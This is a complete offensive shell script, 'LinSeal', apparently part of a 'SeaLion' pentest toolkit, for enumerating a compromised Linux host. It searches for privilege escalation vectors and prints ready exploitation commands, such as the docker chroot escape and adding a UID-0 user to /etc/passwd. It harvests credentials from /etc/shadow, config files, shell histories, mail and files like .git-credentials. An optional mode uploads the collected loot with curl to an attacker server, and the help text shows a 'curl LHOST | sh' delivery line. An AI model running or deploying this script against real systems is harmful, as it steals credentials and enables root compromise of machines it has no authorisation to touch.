#!/bin/sh
# LinSeal — Lightweight Linux Enumeration (SeaLion)
# POSIX-compatible, no dependencies, no broken pipes
#
# Usage: linseal.sh [-o [file]] [-s] [-l] [-h]
#   -o [file]  Save output to file (default: output_N where N is first available)
#   -s         Silent mode — no terminal output, only write to file (requires -o)
#   -l         Also upload output to SeaLion loot via curl
#   -h         Show help

# ── Argument parsing ─────────────────────────────────────────

OUTFILE=""
SILENT=0
LOOT=0
LHOST=""

usage() {
  cat <<'USAGE'
LinSeal — Lightweight Linux Enumeration (SeaLion)

Usage: linseal.sh [OPTIONS]

Options:
  -o [file]   Save output to file. If no name given, uses output_<N>
  -s          Silent — suppress terminal output (implies -o)
  -l          Upload output to SeaLion /upload (loot)
  -L <ip>     SeaLion server IP (auto-detected if omitted)
  -h          Show this help

Environment:
  LHOST       SeaLion server address (auto-detected from /proc if possible)

Examples:
  ./linseal.sh                        # run, print to screen
  ./linseal.sh -o                     # run + save to output_1
  ./linseal.sh -o report.txt          # run + save to report.txt
  ./linseal.sh -o scan.txt -l         # run + save + upload to loot
  ./linseal.sh -o -s                  # save to output_N, no screen output
  ./linseal.sh -o -s -l               # save + upload, silent
  curl http://LHOST:2727/static/linseal.sh | sh -s -- -o -l
USAGE
  exit 0
}

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help) usage ;;
    -L)
      shift
      LHOST="$1"
      shift
      ;;
    -o)
      shift
      if [ $# -gt 0 ] && [ "${1#-}" = "$1" ] && [ -n "$1" ]; then
        OUTFILE="$1"
        shift
      else
        OUTFILE="__auto__"
      fi
      ;;
    -*)
      _flags=$(echo "$1" | sed 's/^-//')
      shift
      # handle -L<ip> combined
      case "$_flags" in
        L*)
          LHOST=$(echo "$_flags" | sed 's/^L//')
          if [ -z "$LHOST" ] && [ $# -gt 0 ]; then
            LHOST="$1"
            shift
          fi
          continue
          ;;
      esac
      case "$_flags" in
        *o*)
          _rest=$(echo "$_flags" | sed 's/o//')
          case "$_rest" in *s*) SILENT=1 ;; esac
          case "$_rest" in *l*) LOOT=1 ;; esac
          if [ $# -gt 0 ] && [ "${1#-}" = "$1" ] && [ -n "$1" ]; then
            OUTFILE="$1"
            shift
          else
            OUTFILE="__auto__"
          fi
          ;;
        *)
          case "$_flags" in *s*) SILENT=1 ;; esac
          case "$_flags" in *l*) LOOT=1 ;; esac
          ;;
      esac
      ;;
    *) shift ;;
  esac
done

if [ "$OUTFILE" = "__auto__" ]; then
  n=1
  while [ -e "output_$n" ]; do
    n=$((n + 1))
  done
  OUTFILE="output_$n"
fi

if [ "$SILENT" -eq 1 ] && [ -z "$OUTFILE" ]; then
  n=1
  while [ -e "output_$n" ]; do
    n=$((n + 1))
  done
  OUTFILE="output_$n"
fi

if [ "$LOOT" -eq 1 ] && [ -z "$OUTFILE" ]; then
  n=1
  while [ -e "output_$n" ]; do
    n=$((n + 1))
  done
  OUTFILE="output_$n"
fi

# ── Auto-detect LHOST from active connections ────────────────

if [ -z "$LHOST" ]; then
  for f in /proc/net/tcp /proc/net/tcp6; do
    [ -r "$f" ] || continue
    _candidate=$(awk '$4 == "01" {split($3,a,":"); if (a[1] != "00000000" && a[1] != "0100007F") print a[1]}' "$f" 2>/dev/null | head -1)
    if [ -n "$_candidate" ]; then
      _hex="$_candidate"
      _a=$(printf "%d" "0x$(echo "$_hex" | cut -c7-8)" 2>/dev/null)
      _b=$(printf "%d" "0x$(echo "$_hex" | cut -c5-6)" 2>/dev/null)
      _c=$(printf "%d" "0x$(echo "$_hex" | cut -c3-4)" 2>/dev/null)
      _d=$(printf "%d" "0x$(echo "$_hex" | cut -c1-2)" 2>/dev/null)
      LHOST="$_a.$_b.$_c.$_d"
      break
    fi
  done
fi

# ── Output engine ────────────────────────────────────────────

_strip_colors() {
  sed 's/\x1b\[[0-9;]*m//g'
}

emit() {
  if [ -n "$OUTFILE" ] && [ "$SILENT" -eq 1 ]; then
    printf "%s\n" "$1" | _strip_colors >> "$OUTFILE"
  elif [ -n "$OUTFILE" ]; then
    printf "%s\n" "$1"
    printf "%s\n" "$1" | _strip_colors >> "$OUTFILE"
  else
    printf "%s\n" "$1"
  fi
}

emit_raw() {
  if [ -n "$OUTFILE" ] && [ "$SILENT" -eq 1 ]; then
    printf "%b\n" "$1" | _strip_colors >> "$OUTFILE"
  elif [ -n "$OUTFILE" ]; then
    printf "%b\n" "$1"
    printf "%b\n" "$1" | _strip_colors >> "$OUTFILE"
  else
    printf "%b\n" "$1"
  fi
}

# ── Colors ───────────────────────────────────────────────────
R='\033[1;31m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
B='\033[1;34m'
W='\033[1;37m'
N='\033[0m'

banner() {
  emit_raw ""
  emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
  emit_raw "${B}║${W}    LinSeal — Lightweight Linux Enumeration   ${B}║${N}"
  emit_raw "${B}║${G}              SeaLion Toolkit                 ${B}║${N}"
  emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
  emit_raw ""
}

section() {
  emit_raw ""
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw "${C}  $1${N}"
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw ""
}

hi()   { emit_raw "${R}[!] $1${N}"; }
warn() { emit_raw "${Y}[*] $1${N}"; }
info() { emit_raw "${G}[+] $1${N}"; }

run() {
  _out=$("$@" 2>/dev/null) || true
  if [ -n "$_out" ]; then
    emit "$_out"
  fi
}

# ── Init output file ────────────────────────────────────────

if [ -n "$OUTFILE" ]; then
  : > "$OUTFILE"
  if [ "$SILENT" -eq 0 ]; then
    printf "\033[1;32m[+] Output will be saved to: %s\033[0m\n" "$OUTFILE"
  fi
fi

# ══════════════════════════════════════════════════════════════
#                         SCAN START
# ══════════════════════════════════════════════════════════════

_RECS_FILE=$(mktemp 2>/dev/null || echo "/tmp/.linseal_recs_$$")
: > "$_RECS_FILE"
_rec() { echo "$1" >> "$_RECS_FILE"; }

banner

# ── System Info ──────────────────────────────────────────────
section "SYSTEM INFO"

info "Hostname: $(hostname 2>/dev/null)"
info "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || uname -s)"
info "Kernel: $(uname -r)"
info "Arch: $(uname -m)"
info "Uptime: $(uptime 2>/dev/null | sed 's/.*up/up/' | sed 's/,.*user.*//')"

# ── Current User ─────────────────────────────────────────────
section "CURRENT USER"

info "User: $(whoami) (uid=$(id -u), gid=$(id -g))"
info "Groups: $(id -Gn 2>/dev/null || groups 2>/dev/null)"

if [ "$(id -u)" -eq 0 ]; then
  hi "RUNNING AS ROOT"
fi

for g in docker lxd adm sudo wheel disk video; do
  if id -Gn 2>/dev/null | grep -qw "$g"; then
    hi "Member of '$g' group — potential privesc vector"
    case "$g" in
      docker) _rec "[PRIVESC] Member of 'docker' group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh" ;;
      lxd)    _rec "[PRIVESC] Member of 'lxd' group → lxd init + mount host filesystem" ;;
      disk)   _rec "[PRIVESC] Member of 'disk' group → debugfs /dev/sda to read any file" ;;
      adm)    _rec "[INFO] Member of 'adm' group → can read logs in /var/log" ;;
    esac
  fi
done

# ── Sudo ─────────────────────────────────────────────────────
section "SUDO"

if command -v sudo >/dev/null 2>&1; then
  SUDO_OUT=$(sudo -l 2>/dev/null) || true
  if [ -n "$SUDO_OUT" ]; then
    emit "$SUDO_OUT"
    if echo "$SUDO_OUT" | grep -qi "NOPASSWD"; then
      hi "NOPASSWD entries found — check for privesc"
      _rec "[PRIVESC] sudo NOPASSWD entries found → check GTFOBins for each allowed command"
    fi
    if echo "$SUDO_OUT" | grep -qi "(ALL)"; then
      hi "Can run commands as ALL users"
      _rec "[PRIVESC] sudo (ALL) → may be able to escalate if any allowed command has GTFOBins entry"
    fi
    for cmd in env find vim nmap python perl ruby bash sh less more awk node php tar zip wget curl; do
      if echo "$SUDO_OUT" | grep -qw "$cmd"; then
        hi "sudo $cmd — GTFOBins candidate"
        _rec "[PRIVESC] sudo $cmd → check https://gtfobins.github.io/gtfobins/$cmd/#sudo"
      fi
    done
  else
    warn "sudo -l requires password or is not allowed"
  fi
else
  info "sudo not installed"
fi

# ── SUID / SGID ─────────────────────────────────────────────
section "SUID BINARIES"

find / -perm -4000 -type f 2>/dev/null | while read -r f; do
  bn=$(basename "$f")
  case "$bn" in
    su|sudo|mount|umount|ping|passwd|chsh|chfn|newgrp|gpasswd|pkexec|crontab|at|fusermount*|ssh-keysign|pam_timestamp_check|unix_chkpwd|dbus-daemon-launch-helper)
      info "SUID: $f (standard)"
      ;;
    *)
      hi "SUID: $f — NON-STANDARD"
      _rec "[PRIVESC] Non-standard SUID: $f → check GTFOBins / known exploits for $(basename "$f")"
      ;;
  esac
done

section "SGID BINARIES"

find / -perm -2000 -type f 2>/dev/null | while read -r f; do
  bn=$(basename "$f")
  case "$bn" in
    wall|write|ssh-agent|crontab|expiry|chage|unix_chkpwd|locate|mlocate)
      info "SGID: $f (standard)"
      ;;
    *)
      warn "SGID: $f — non-standard"
      ;;
  esac
done

# ── Capabilities ─────────────────────────────────────────────
section "CAPABILITIES"

if command -v getcap >/dev/null 2>&1; then
  getcap -r / 2>/dev/null | while read -r line; do
    if echo "$line" | grep -qiE 'cap_setuid|cap_setgid|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_net_raw'; then
      hi "CAP: $line"
      _bin=$(echo "$line" | awk '{print $1}')
      echo "$line" | grep -qi 'cap_setuid' && _rec "[PRIVESC] $_bin has cap_setuid → can change UID to root"
      echo "$line" | grep -qi 'cap_sys_admin' && _rec "[PRIVESC] $_bin has cap_sys_admin → mount/namespace abuse possible"
      echo "$line" | grep -qi 'cap_dac_override' && _rec "[PRIVESC] $_bin has cap_dac_override → can read/write any file"
    else
      warn "CAP: $line"
    fi
  done
else
  warn "getcap not available"
fi

# ── Writable dirs / files ───────────────────────────────────
section "WRITABLE INTERESTING FILES"

for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts /etc/ssh/sshd_config; do
  if [ -w "$f" ] 2>/dev/null; then
    hi "WRITABLE: $f"
    case "$f" in
      /etc/passwd) _rec "[PRIVESC] /etc/passwd is writable → add root user: echo 'root2:$(openssl passwd pass):0:0::/root:/bin/bash' >> /etc/passwd" ;;
      /etc/shadow) _rec "[PRIVESC] /etc/shadow is writable → replace root password hash" ;;
      /etc/sudoers) _rec "[PRIVESC] /etc/sudoers is writable → add: $(whoami) ALL=(ALL) NOPASSWD: ALL" ;;
      /etc/crontab) _rec "[PRIVESC] /etc/crontab is writable → add reverse shell cronjob" ;;
    esac
  fi
done

for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /etc/sudoers.d; do
  if [ -d "$d" ] && [ -w "$d" ] 2>/dev/null; then
    hi "WRITABLE DIR: $d"
    _rec "[PRIVESC] $d is writable → drop a script/rule to get root execution"
  fi
done

# ── Cron ─────────────────────────────────────────────────────
section "CRON JOBS"

for f in /etc/crontab /etc/cron.d/*; do
  if [ -r "$f" ] 2>/dev/null; then
    emit_raw "${W}--- $f ---${N}"
    run cat "$f"
  fi
done

emit_raw "\n${W}--- User crontab ---${N}"
_ucron=$(crontab -l 2>/dev/null) || true
if [ -n "$_ucron" ]; then
  emit "$_ucron"
else
  info "No user crontab"
fi

grep -rhE '^[^#].*/' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -oE '/[^ ]+' | sort -u | while read -r s; do
  if [ -f "$s" ] && [ -w "$s" ]; then
    hi "WRITABLE cron script: $s"
    _rec "[PRIVESC] Writable cron script: $s → inject reverse shell, wait for cron to run it as root"
  fi
done

# ── Timers ───────────────────────────────────────────────────
section "SYSTEMD TIMERS"

if command -v systemctl >/dev/null 2>&1; then
  run systemctl list-timers --no-pager
fi

# ── Processes ────────────────────────────────────────────────
section "RUNNING PROCESSES (interesting)"

ps aux 2>/dev/null | grep -vE '^\[|grep|ps aux' | while read -r line; do
  puser=$(echo "$line" | awk '{print $1}')
  proc=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf "%s ", $i; print ""}')
  if [ "$puser" = "root" ]; then
    for kw in python perl ruby node php apache nginx mysql postgres docker; do
      if echo "$proc" | grep -qi "$kw"; then
        warn "root: $proc"
        break
      fi
    done
  fi
done

emit_raw "\n${W}--- All processes ---${N}"
run ps aux

# ── Network ──────────────────────────────────────────────────
section "NETWORK — LISTENING PORTS"

if command -v ss >/dev/null 2>&1; then
  run ss -tlnp
elif command -v netstat >/dev/null 2>&1; then
  run netstat -tlnp
fi

emit_raw "\n${W}--- Port analysis ---${N}"
_ports=""
if command -v ss >/dev/null 2>&1; then
  _ports=$(ss -tlnp 2>/dev/null | awk 'NR>1 {print $4}')
elif command -v netstat >/dev/null 2>&1; then
  _ports=$(netstat -tlnp 2>/dev/null | awk 'NR>2 {print $4}')
fi

echo "$_ports" | while read -r addr; do
  [ -z "$addr" ] && continue
  _ip=$(echo "$addr" | sed 's/:[0-9]*$//' | sed 's/^\*/0.0.0.0/')
  _port=$(echo "$addr" | grep -oE '[0-9]+$')
  [ -z "$_port" ] && continue

  _note=""
  _banner=""
  case "$_port" in
    21)   _note="FTP — try anonymous login" ;;
    22)   _note="SSH" ;;
    23)   _note="Telnet — cleartext" ;;
    25)   _note="SMTP" ;;
    53)   _note="DNS — try zone transfer" ;;
    80|8080|8000|8443|8888|3000)
          _note="HTTP"
          _banner=$(curl -sI -m 2 "http://${_ip}:${_port}/" 2>/dev/null | grep -iE '^Server:|^X-Powered-By:' | head -2) || true
          ;;
    110)  _note="POP3" ;;
    111)  _note="rpcbind — check NFS/NIS" ;;
    143)  _note="IMAP" ;;
    443|993|995)
          _note="SSL/TLS service" ;;
    445)  _note="SMB — try null session" ;;
    1337) _note="Non-standard — may be admin panel" ;;
    2049) _note="NFS — check exports + no_root_squash" ;;
    3306) _note="MySQL — try default creds" ;;
    5432) _note="PostgreSQL — try default creds" ;;
    6379) _note="Redis — try no-auth access" ;;
    8009) _note="AJP — GhostCat possible" ;;
    11211) _note="Memcached — info dump" ;;
    27017) _note="MongoDB — try no-auth" ;;
    *)    _note="" ;;
  esac

  _scope="external"
  case "$_ip" in
    127.*|::1|0.0.0.0|::) _scope="internal" ;;
  esac
  [ "$_ip" = "0.0.0.0" ] || [ "$_ip" = "::" ] && _scope="all-interfaces"

  if [ -n "$_note" ]; then
    _line="$_ip:$_port  [$_scope]  $_note"
    if echo "$_ip" | grep -qE '^127\.|^::1$'; then
      warn "$_line"
    else
      hi "$_line"
    fi
    [ -n "$_banner" ] && emit "  $_banner"
    case "$_port" in
      21)    _rec "[ENUM] FTP on $_ip:$_port → try: ftp -a $_ip (anonymous login)" ;;
      2049)  _rec "[ENUM] NFS on $_ip:$_port → from attacker: showmount -e <target> + check no_root_squash" ;;
      3306)  _rec "[ENUM] MySQL on $_ip:$_port → try: mysql -u root -h $_ip (no password / creds from config files)" ;;
      5432)  _rec "[ENUM] PostgreSQL on $_ip:$_port → try: psql -U postgres -h $_ip" ;;
      6379)  _rec "[ENUM] Redis on $_ip:$_port → try: redis-cli -h $_ip INFO (no-auth access)" ;;
      27017) _rec "[ENUM] MongoDB on $_ip:$_port → try: mongosh $_ip (no-auth access)" ;;
      445)   _rec "[ENUM] SMB on $_ip:$_port → try: smbclient -L //$_ip -N (null session)" ;;
    esac
  fi
done

emit_raw "\n${W}--- All connections ---${N}"
if command -v ss >/dev/null 2>&1; then
  run ss -tanp
elif command -v netstat >/dev/null 2>&1; then
  run netstat -tanp
fi

section "NETWORK — INTERFACES"
if command -v ip >/dev/null 2>&1; then
  run ip addr
else
  run ifconfig
fi

section "NETWORK — ROUTES"
if command -v ip >/dev/null 2>&1; then
  run ip route
else
  run route -n
fi

section "NETWORK — ARP"
if command -v ip >/dev/null 2>&1; then
  run ip neigh
else
  run arp -a
fi

# ── Interesting files ────────────────────────────────────────
section "INTERESTING FILES"

info "Looking for passwords/keys in common locations..."

for f in /etc/shadow /etc/master.passwd; do
  if [ -r "$f" ]; then
    hi "READABLE: $f"
    run cat "$f"
  fi
done

emit_raw "\n${W}--- SSH keys ---${N}"
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null | while read -r f; do
  if [ -r "$f" ]; then
    hi "FOUND: $f"
    _ls=$(ls -la "$f" 2>/dev/null) || true
    [ -n "$_ls" ] && emit "$_ls"
  fi
done
find /home /root /opt /srv -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | grep -vE '/\.cache/|/\.local/share/gnome' | while read -r f; do
  if [ -r "$f" ]; then
    hi "FOUND: $f"
    _ls=$(ls -la "$f" 2>/dev/null) || true
    [ -n "$_ls" ] && emit "$_ls"
  fi
done

emit_raw "\n${W}--- Config files with passwords ---${N}"
for f in /var/www /opt /home /srv /etc; do
  find "$f" -maxdepth 4 -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name ".env" -o -name "wp-config.php" -o -name "config.php" -o -name "database.yml" -o -name "settings.py" -o -name "*.properties" \) -readable 2>/dev/null | while read -r c; do
    _matches=$(grep -inE 'passw|secret|key.*=|token|credentials' "$c" 2>/dev/null | head -5) || true
    if [ -n "$_matches" ]; then
      hi "PASSWORDS in: $c"
      emit "$_matches"
      emit_raw ""
    fi
  done
done

emit_raw "\n${W}--- History files ---${N}"
for f in /home/*/.bash_history /home/*/.zsh_history /root/.bash_history /home/*/.mysql_history /home/*/.psql_history; do
  if [ -r "$f" ] 2>/dev/null; then
    hi "READABLE: $f"
    _wc=$(wc -l < "$f" 2>/dev/null) || true
    [ -n "$_wc" ] && info "$f: $_wc lines"
    _hgrep=$(grep -iE 'passw|secret|token|key|mysql.*-p|sudo|su |ssh ' "$f" 2>/dev/null | head -10) || true
    [ -n "$_hgrep" ] && emit "$_hgrep"
  fi
done

emit_raw "\n${W}--- Backup files ---${N}"
find / -maxdepth 4 -type f \( -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "*.orig" -o -name "*backup*" -o -name "*.sql" -o -name "*.db" -o -name "*.sqlite" \) -readable 2>/dev/null | head -20 | while read -r f; do
  warn "BACKUP: $f"
done

emit_raw "\n${W}--- Hidden sensitive files ---${N}"
for d in /home/* /root; do
  [ -d "$d" ] || continue
  for hf in .git-credentials .netrc .pgpass .my.cnf .docker/config.json .kube/config .aws/credentials .ssh/config .gnupg/private-keys-v1.d .config/filezilla/sitemanager.xml .config/rclone/rclone.conf .config/gcloud/credentials.db .local/share/keyrings .vnc/passwd .Xauthority; do
    fp="$d/$hf"
    if [ -r "$fp" ] 2>/dev/null; then
      hi "HIDDEN: $fp"
      _ls=$(ls -la "$fp" 2>/dev/null) || true
      [ -n "$_ls" ] && emit "$_ls"
      case "$hf" in
        .git-credentials|.netrc|.pgpass|.my.cnf)
          _content=$(cat "$fp" 2>/dev/null | head -5) || true
          [ -n "$_content" ] && emit "$_content"
          ;;
        .ssh/config)
          _hosts=$(grep -i 'Host\|IdentityFile\|User ' "$fp" 2>/dev/null) || true
          [ -n "$_hosts" ] && emit "$_hosts"
          ;;
        .docker/config.json)
          _auth=$(grep -i 'auth' "$fp" 2>/dev/null) || true
          [ -n "$_auth" ] && hi "Docker auth tokens found"
          ;;
        .kube/config|.aws/credentials|.config/rclone/rclone.conf)
          hi "Cloud credentials — review manually: $fp"
          ;;
      esac
    fi
  done
done

# ── /etc/passwd ──────────────────────────────────────────────
section "USERS"

info "Users with shell:"
_shells=$(grep -E '/bin/(ba)?sh$|/bin/zsh$|/bin/fish$' /etc/passwd 2>/dev/null) || true
[ -n "$_shells" ] && emit "$_shells"

info "Users with UID 0:"
awk -F: '$3 == 0 {print}' /etc/passwd 2>/dev/null | while read -r line; do
  if ! echo "$line" | grep -q '^root:'; then
    hi "NON-ROOT UID 0: $line"
  else
    info "$line"
  fi
done

# ── Home dirs ────────────────────────────────────────────────
section "HOME DIRECTORIES"

run ls -la /home/
for d in /home/*; do
  [ -d "$d" ] || continue
  if [ -r "$d" ]; then
    emit_raw "\n${W}--- $d ---${N}"
    run ls -la "$d"
  fi
done

# ── Docker / LXD ─────────────────────────────────────────────
section "CONTAINERS"

if command -v docker >/dev/null 2>&1; then
  warn "Docker installed"
  run docker ps -a
  run docker images
  if [ -w /var/run/docker.sock ]; then
    hi "docker.sock is WRITABLE — container escape possible"
    _rec "[PRIVESC] docker.sock writable → docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
  fi
fi

if command -v lxc >/dev/null 2>&1; then
  warn "LXC/LXD installed"
  run lxc list
fi

# ── Mounted filesystems ─────────────────────────────────────
section "MOUNTS"

mount 2>/dev/null | while read -r line; do
  if echo "$line" | grep -qE 'nosuid|noexec'; then
    info "$line"
  else
    emit "$line"
  fi
done

emit_raw "\n${W}--- /etc/fstab ---${N}"
run cat /etc/fstab

# ── Disk ─────────────────────────────────────────────────────
section "DISK USAGE"
run df -h

# ── Kernel exploits ──────────────────────────────────────────
section "KERNEL INFO"

KERN=$(uname -r)
info "Kernel: $KERN"

KERN_MAJ=$(echo "$KERN" | cut -d. -f1)
KERN_MIN=$(echo "$KERN" | cut -d. -f2)

if [ "$KERN_MAJ" -lt 4 ] 2>/dev/null; then
  hi "Old kernel ($KERN) — likely vulnerable to known exploits"
elif [ "$KERN_MAJ" -eq 4 ] && [ "$KERN_MIN" -lt 15 ] 2>/dev/null; then
  warn "Kernel $KERN — check for known exploits"
fi

if [ -f /proc/version ]; then
  info "Version: $(cat /proc/version)"
fi

# ── Environment ──────────────────────────────────────────────
section "ENVIRONMENT"

env 2>/dev/null | grep -iE 'pass|key|secret|token|api|cred|database|db_|mysql|postgres' | while read -r line; do
  hi "ENV: $line"
done

info "PATH: $PATH"

# ── NFS exports ──────────────────────────────────────────────
section "NFS EXPORTS"

if [ -r /etc/exports ]; then
  emit_raw "${W}--- /etc/exports ---${N}"
  while read -r line; do
    case "$line" in
      \#*|"") continue ;;
    esac
    if echo "$line" | grep -qi 'no_root_squash'; then
      hi "no_root_squash: $line"
      _rec "[PRIVESC] NFS export with no_root_squash → mount on attacker, create SUID binary, run from target"
    else
      info "$line"
    fi
  done < /etc/exports
else
  info "/etc/exports not readable"
fi

# ── PATH hijacking ───────────────────────────────────────────
section "PATH HIJACKING"

echo "$PATH" | tr ':' '\n' | while read -r _pdir; do
  [ -z "$_pdir" ] && continue
  if [ -d "$_pdir" ] && [ -w "$_pdir" ] 2>/dev/null; then
    hi "WRITABLE PATH dir: $_pdir"
    _rec "[PRIVESC] Writable PATH directory: $_pdir → drop malicious binary to hijack commands run by root"
  fi
done

# ── ld.so.preload ────────────────────────────────────────────
if [ -e /etc/ld.so.preload ]; then
  if [ -w /etc/ld.so.preload ]; then
    hi "ld.so.preload exists and is WRITABLE — instant privesc"
    _rec "[PRIVESC] /etc/ld.so.preload is writable → compile shared lib with root shell, add path to ld.so.preload"
  else
    warn "ld.so.preload exists: $(cat /etc/ld.so.preload 2>/dev/null)"
  fi
fi

# ── ptrace scope ─────────────────────────────────────────────
if [ -r /proc/sys/kernel/yama/ptrace_scope ]; then
  _ptrace=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
  if [ "$_ptrace" = "0" ]; then
    hi "ptrace_scope=0 — can attach to any process"
    _rec "[INFO] ptrace_scope=0 → can inject into running processes (e.g. ssh-agent, running root services)"
  else
    info "ptrace_scope=$_ptrace"
  fi
fi

# ── Web applications ────────────────────────────────────────
section "WEB APPLICATIONS"

for _webroot in /var/www/html /var/www /srv/http /opt; do
  if [ -d "$_webroot" ]; then
    emit_raw "${W}--- $_webroot ---${N}"
    ls -la "$_webroot" 2>/dev/null | while read -r line; do
      emit "$line"
    done
    for _wc in "$_webroot"/*/wp-config.php "$_webroot"/*/config.php "$_webroot"/*/configuration.php "$_webroot"/*/.env "$_webroot"/*/settings.py "$_webroot"/*/database.yml; do
      if [ -r "$_wc" ] 2>/dev/null; then
        hi "Web config: $_wc"
        _wpass=$(grep -inE 'passw|secret|key.*=|token|db_' "$_wc" 2>/dev/null | head -5) || true
        [ -n "$_wpass" ] && emit "$_wpass"
      fi
    done
  fi
done

# ── Writable root-owned scripts ──────────────────────────────
section "WRITABLE ROOT FILES"

find /usr/local/bin /usr/local/sbin /opt /etc/init.d -type f -user root -writable 2>/dev/null | head -15 | while read -r f; do
  hi "WRITABLE root file: $f"
  _rec "[PRIVESC] Writable root-owned file: $f → inject code/binary to execute as root"
done

# ── Mail ─────────────────────────────────────────────────────
section "MAIL"

for _mdir in /var/mail /var/spool/mail; do
  if [ -d "$_mdir" ]; then
    for _mf in "$_mdir"/*; do
      [ -f "$_mf" ] || continue
      if [ -r "$_mf" ]; then
        _mlines=$(wc -l < "$_mf" 2>/dev/null) || _mlines=0
        if [ "$_mlines" -gt 0 ] 2>/dev/null; then
          hi "MAIL: $_mf ($_mlines lines)"
          _mgrep=$(grep -iE 'passw|credential|secret|token|ssh|key' "$_mf" 2>/dev/null | head -5) || true
          [ -n "$_mgrep" ] && emit "$_mgrep"
        fi
      fi
    done
  fi
done

# ── Installed tools ──────────────────────────────────────────
section "AVAILABLE TOOLS"

_tools=""
for _t in gcc cc make gdb strace ltrace python3 python perl ruby socat nmap nc ncat netcat curl wget ssh scp rsync tcpdump wireshark john hashcat hydra sqlmap gcloud aws kubectl docker; do
  if command -v "$_t" >/dev/null 2>&1; then
    _tools="$_tools $_t"
  fi
done
if [ -n "$_tools" ]; then
  info "Found:$_tools"
else
  info "No notable tools found"
fi

# ── Recommendations ──────────────────────────────────────────
section "RECOMMENDATIONS"

if [ -s "$_RECS_FILE" ]; then
  _privesc=0
  _enum=0
  _info=0

  while IFS= read -r _r; do
    case "$_r" in
      \[PRIVESC\]*) _privesc=$((_privesc + 1)) ;;
      \[ENUM\]*)    _enum=$((_enum + 1)) ;;
      \[INFO\]*)    _info=$((_info + 1)) ;;
    esac
  done < "$_RECS_FILE"

  emit_raw "${R}  Privilege Escalation vectors: $_privesc${N}"
  emit_raw "${Y}  Enumeration leads: $_enum${N}"
  emit_raw "${G}  Informational: $_info${N}"
  emit_raw ""

  if [ "$_privesc" -gt 0 ]; then
    emit_raw "${R}--- Privilege Escalation ---${N}"
    grep '^\[PRIVESC\]' "$_RECS_FILE" | while IFS= read -r _r; do
      emit_raw "${R}  ► ${_r#\[PRIVESC\] }${N}"
    done
    emit_raw ""
  fi

  if [ "$_enum" -gt 0 ]; then
    emit_raw "${Y}--- Enumeration ---${N}"
    grep '^\[ENUM\]' "$_RECS_FILE" | while IFS= read -r _r; do
      emit_raw "${Y}  ► ${_r#\[ENUM\] }${N}"
    done
    emit_raw ""
  fi

  if [ "$_info" -gt 0 ]; then
    emit_raw "${G}--- Informational ---${N}"
    grep '^\[INFO\]' "$_RECS_FILE" | while IFS= read -r _r; do
      emit_raw "${G}  ► ${_r#\[INFO\] }${N}"
    done
    emit_raw ""
  fi
else
  info "No notable findings to recommend."
fi

rm -f "$_RECS_FILE"

# ══════════════════════════════════════════════════════════════
#                         SCAN COMPLETE
# ══════════════════════════════════════════════════════════════

emit_raw ""
emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
emit_raw "${B}║${G}          LinSeal scan complete                ${B}║${N}"
emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
emit_raw ""
emit_raw "${Y}[!] = Critical   ${G}[+] = Info   ${Y}[*] = Interesting${N}"
emit_raw ""

# ── Post-scan: summary ──────────────────────────────────────

if [ -n "$OUTFILE" ]; then
  _lines=$(wc -l < "$OUTFILE" 2>/dev/null || echo "?")
  printf "\033[1;32m[+] Output saved to: %s (%s lines)\033[0m\n" "$OUTFILE" "$_lines"
fi

# ── Post-scan: upload to loot ────────────────────────────────

if [ "$LOOT" -eq 1 ] && [ -n "$OUTFILE" ]; then
  _lname=$(basename "$OUTFILE")
  _uploaded=0

  if [ -n "$LHOST" ]; then
    if [ -n "$SLPORT" ]; then
      _ports="$SLPORT"
    else
      _ports="2727 2020 8080 8000 80 8443 9090"
    fi
    for _port in $_ports; do
      if curl -sf -m 3 -F "file=@${OUTFILE}" "http://${LHOST}:${_port}/upload" >/dev/null 2>&1; then
        printf "\033[1;32m[+] Uploaded to loot: http://%s:%s/upload (%s)\033[0m\n" "$LHOST" "$_port" "$_lname"
        _uploaded=1
        break
      fi
    done
  fi

  if [ "$_uploaded" -eq 0 ]; then
    printf "\033[1;33m[*] Loot upload failed — could not reach SeaLion server\033[0m\n"
    if [ -z "$LHOST" ]; then
      printf "\033[1;33m[*] Set LHOST manually: LHOST=<ip> ./linseal.sh -o -l\033[0m\n"
    fi
  fi
elif [ "$LOOT" -eq 1 ] && [ -z "$OUTFILE" ]; then
  printf "\033[1;33m[*] -l requires -o (need a file to upload)\033[0m\n"
fi

# ── Notify in shell ──────────────────────────────────────────
if [ "$SILENT" -eq 1 ]; then
  printf "\033[1;32m[+] LinSeal scan complete.\033[0m"
  [ -n "$OUTFILE" ] && printf " \033[1;32mOutput: %s\033[0m" "$OUTFILE"
  printf "\n"
fi
